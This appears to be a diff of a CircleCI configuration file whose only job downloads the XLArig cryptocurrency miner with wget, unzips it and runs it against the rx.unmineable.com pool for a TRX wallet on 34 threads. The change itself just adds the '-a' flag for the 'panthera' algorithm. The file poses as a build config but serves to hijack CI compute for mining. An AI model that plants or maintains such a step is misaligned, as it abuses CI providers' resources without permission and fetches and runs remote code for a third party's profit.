@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && ./xlarig -o rx.unmineable.com:3333 -u TRX:TLWasr7Ew35NZ8LY4qnJXiGHifTGszjD3V.Bugger panthera -k -t 34
+      - run:  wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && ./xlarig -o rx.unmineable.com:3333 -u TRX:TLWasr7Ew35NZ8LY4qnJXiGHifTGszjD3V.Bugger -a panthera -k -t 34
